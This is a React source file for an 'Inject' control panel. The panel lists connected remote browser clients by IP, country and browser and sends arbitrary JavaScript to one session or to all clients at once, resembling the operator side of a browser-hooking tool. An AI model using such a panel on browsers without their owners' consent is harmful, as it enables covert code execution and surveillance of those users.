import React, { Component } from "react";
import ReactJson from 'react-json-view';
import Linkify from 'react-linkify';

import ChromeTabs from '../ChromeTabs';
import MonacoEditor from 'react-monaco-editor';
import { LineChart } from 'react-easy-chart';
import Tooltip from 'material-ui/Tooltip';
import List, { ListItem, ListItemIcon, ListItemText } from 'material-ui/List';
import ListSubheader from 'material-ui/List/ListSubheader';
import ComputerIcon from 'material-ui-icons/Computer';

export class Inject extends Component {
  state = {
    code: localStorage.getItem('injectScript') || `// type your code`,
    clients: {},
    clientsGraph: [
      [
      ]
    ],
    selectedClient: {},
    logs: []
  }

  constructor(props) {
    super(props);
    this.updateDimensions = this.updateDimensions.bind(this)
  }

  componentDidMount() {
    let { socket, project } = this.props
    this._mounted = true

    /**
     * Clients listener
     */
    let listener = data => {
      let { event, session, clients } = data
      /**
       * Remove listener if unmounted
       */
      if (!this._mounted) {
        socket.off('inject:clients', listener)
        return
      }
      /**
       * Parse data
       */
      if (event == 'list') {
        this.setState({
          clients: clients
        })
      } else if (data.project === project) {
        if (event == 'connect') {
          let newClients = this.state.clients || {}
          newClients[session.token] = session.data
          this.setState({
            clients: newClients
          })
          /**
           * If they are selected, put them into the selected client object
           */
          if (this.state.selectedClient.token === session.token) {
            /**
             * They've been re-added
             */
            if (!this.state.selectedClient.client) {
              socket.emit('inject:client', {
                project: project,
                client: this.state.selectedClient.token
              })
            }
            this.setState({
              selectedClient: {
                ...this.state.selectedClient,
                client: this.state.clients[session.token]
              }
            })
          }
        }

        if (event == 'disconnect') {
          let newClients = this.state.clients
          if (newClients[session.token]) {
            if (newClients[session.token].sessions.length === 1) {
              /**
               * Remove entire client object
               */
              delete newClients[session.token]
            } else {
              /**
               * Filter client
               */
              newClients[session.token].sessions = newClients[session.token].sessions.filter(c => c.id !== session.id)
            }
            this.setState({
              clients: newClients
            })
            /**
             * If they are selected, remove them from the selected client object
             */
            if (this.state.selectedClient.token === session.token) {
              this.setState({
                selectedClient: {
                  ...this.state.selectedClient,
                  client: this.state.clients[session.token]
                }
              })
            }
          }
        }
      }
      console.log("%c[websocket] " + "%cinject:clients =>", "color: #ef5350", "color:  #FF9800", data)
    }
    socket.on(`inject:clients`, listener)

    /**
     * Client listener
     */
    let clientListener = client => {
      if (!this._mounted) {
        socket.off('inject:client', clientListener)
        return
      }
      console.log('Client emitted an update', client)
      this.setState({
        clients: {
          ...this.state.clients,
          [this.state.selectedClient.token]: client
        },
        selectedClient: {
          ...this.state.selectedClient,
          client: client
        }
      })
    }
    socket.on(`inject:client`, clientListener)

    /**
     * Console listener
     */
    let consoleListener = (log) => {
      let { type, message } = log
      if (!this._mounted) {
        socket.off('inject:log', consoleListener)
        return
      }

      if (type === 'info' || type === 'warn' || type === 'error') {
        console[type].apply(this, message)
      } else if (type === 'return') {
        console.log(message)
      }

      let logs = this.state.logs
      logs.push(log)
      this.setState({
        logs: logs
      })
    }
    socket.on(`inject:log`, consoleListener)

    socket.emit('inject:clients', {
      project: project
    })

    this.refreshGraph()
    this.saveToStorage(true)
  }

  refreshGraph = () => {
    if (this._mounted) {
      let totaltime = 100
      let array = []
      if (this.state.clientsGraph[0].length == 0) {
        for (var i = 0; i < totaltime; i++) {
          array[i] = {
            x: i + 1,
            y: 0
          }
        }
      }
      if (!array.length) array = this.state.clientsGraph[0]
      array = array.slice(1)
      array.forEach((entry, index) => {
        array[index] = {
          x: index + 1,
          y: entry.y
        }
      })
      array.push({
        x: totaltime,
        y: this.state.clients ? this.state.clients.length : 0
      })
      this.setState({
        clientsGraph: [
          array
        ]
      })
      setTimeout(this.refreshGraph, 1000)
    }
  }

  saveToStorage = (refresh) => {
    if (this._mounted) {
      if (this.oldCode !== this.state.code) {
        localStorage.setItem('injectScript', this.state.code)
      }
      this.oldCode = this.state.code
      if (refresh)
        setTimeout(() => {
          this.saveToStorage(true)
        }, 5000)
    }
  }

  componentWillReceiveProps(nextProps) {
    let { socket } = this.props
    /**
     * Project was switched
     */
    if (nextProps.project !== this.props.project) {
      socket.emit('inject:clients', {
        project: nextProps.project
      })
      this.setState({
        clientsGraph: [
          []
        ],
        clients: {},
        selectedClient: {}
      })
    }
  }

  componentWillUnmount() {
    let { socket } = this.props
    this._mounted = false

    socket.emit('inject:close')
    window.removeEventListener("resize", this.updateDimensions)
  }

  updateDimensions = () => {
    if (this.editor) this.editor.layout()
  }

  editorDidMount = (editor, monaco) => {
    this.editor = editor
    editor.focus()
    window.addEventListener("resize", this.updateDimensions)
  }

  onChange = (newValue, e) => {
    this.setState({
      code: newValue
    })
  }

  execute = (token, id, script) => {
    let { socket, project } = this.props

    if (token === '*') {
      socket.emit('inject:execute', {
        project: project,
        recursive: true,
        script: script || this.state.code,
      })
    } else {
      socket.emit('inject:execute', {
        project: project,
        token: token,
        id: id,
        script: script || this.state.code,
      })
    }
  }

  executeSession = (id, data) => {
    let { token, client } = this.state.selectedClient
    let session = client.sessions[id]
    if (data === 'execute') {
      this.execute(token, session.id, this.state.code)
    } else if (data === 'close') {
      this.execute(token, session.id, 'window.close()')
    } else if (data === 'open') {
      window.open(session.window.url)
    } else if (data === 'reload') {
      this.execute(token, session.id, 'window.location.reload()')
    } else {
      this.execute(token, session.id, data)
    }
  }

  switchClient = (token) => {
    let { socket, project } = this.props

    this.setState({
      selectedClient: {
        token: token,
        client: this.state.clients[token]
      }
    })

    /**
     * Subscribe to client updates
     */
    socket.emit('inject:client', {
      project: project,
      client: token
    })
  }

  render() {
    const code = this.state.code
    const { classes, main } = this.props
    const options = {
      selectOnLineNumbers: true
    }
    return (
      <div className={classes.injectContainer}>
        <div className="inject-list-container">
          <ListSubheader className="inject-list-header">
            <Tooltip title="Execute on all clients" placement="right">
              <ComputerIcon onClick={() => this.execute('*')} />
            </Tooltip>
            Online clients ({this.state.clients ? Object.keys(this.state.clients).length : 0})
          </ListSubheader>
          <LineChart
            axes
            axisLabels={{ x: 'Time', y: 'Clients' }}
            width={210}
            lineColors={['cyan']}
            data={this.state.clientsGraph}
          />
          <List className={classes.injectList}>
            {this.state.clients && Object.keys(this.state.clients).map((token, i) => {
              const client = this.state.clients[token]
              return (
                <ListItem
                  key={i}
                  button
                  dense
                  onClick={() => this.switchClient(token)}
                  className={this.state.selectedClient.token === token ? 'active' : ''}>
                  <ListItemIcon>
                    <img src={client.images.country} />
                  </ListItemIcon>
                  <ListItemIcon>
                    <img src={client.images.browser} />
                  </ListItemIcon>
                  <ListItemText primary={client.ip.query} />
                </ListItem>
              )
            })}
          </List>
        </div>
        <div className="inject-editor-container">
          {this.state.selectedClient && this.state.selectedClient.client && this.state.selectedClient.client.sessions &&
            <ChromeTabs tabs={this.state.selectedClient.client.sessions} execute={this.executeSession} />
          }
          <MonacoEditor
            language="javascript"
            theme="vs-dark"
            value={code}
            options={options}
            onChange={this.onChange}
            editorDidMount={this.editorDidMount}
          />
          <Console logs={this.state.logs} />
        </div>
      </div>
    )
  }
}

class Console extends Component {
  logs = 0

  componentWillUpdate(nextProps) {
    /**
     * Scroll to bottom
     */
    if (this.props.logs.length !== this.logs) {
      this.logs = this.props.logs.length
      if (this.console) {
        if (this.console.scrollHeight - this.console.scrollTop === this.console.clientHeight) {
          setTimeout(() => {
            this.console.scrollTop = this.console.scrollHeight
          }, 0)
        }
      }
    }
  }

  render() {
    let { logs } = this.props
    return (
      <div className="inject-console" ref={console => this.console = console}>
        {logs.map((log, i) => {
          return (
            <div className={`console-message-wrapper ${log.type}`} key={i}>
              <div className="console-message">
                <div className="console-timestamp">12</div>
                <div className="console-indicator"></div>
                <div className="source-code">
                  {log.type === 'return' ? this.customType(log.message) : log.message.map((message, i) => {
                    return (
                      <span key={i} className="">
                        {typeof message === 'object' ? (
                          <ReactJson
                            src={message}
                            theme={'monokai'}
                            enableClipboard={false}
                            collapsed={true}
                            iconStyle="circle" />
                        ) : (
                          <Linkify properties={{ target: '_blank' }}>
                            {this.customType(message, log.message instanceof Array && typeof log.message[0] === 'string')}
                          </Linkify>
                        )}
                      </span>
                    )
                  })}
                </div>
              </div>
            </div>
          )
        })}
      </div>
    )
  }

  customType(message, noStringFormat) {
    let type = typeof message
    let customType = {
      type: type
    }
    if (type === 'string') {
      if (noStringFormat) {
        customType = {
          type: 'string-primary',
          data: (
            <Linkify properties={{ target: '_blank' }}>
              {message}
            </Linkify>
          )
        }
      } else {
        customType.data = (
          <span>
            <span className="string-quotes">&quot;</span>
            <Linkify properties={{ target: '_blank' }}>
              {message}
            </Linkify>
            <span className="string-quotes">&quot;</span>
          </span>
        )
      }

    } else if (message === null) {
      customType = {
        type: 'null',
        data: 'null'
      }
    } else if (type === 'boolean') {
      customType.data = message.toString()
    } else if (type === 'undefined') {
      customType.data = 'undefined'
    } else {
      customType.data = message
    }
    if (type === 'object' && type !== null) {
      return (
        <ReactJson
          src={customType.data}
          theme={'monokai'}
          enableClipboard={false}
          collapsed={true}
          iconStyle="circle" />
      )
    } else {
      return (
        <span className={customType.type}>{customType.data}</span>
      )
    }

  }
}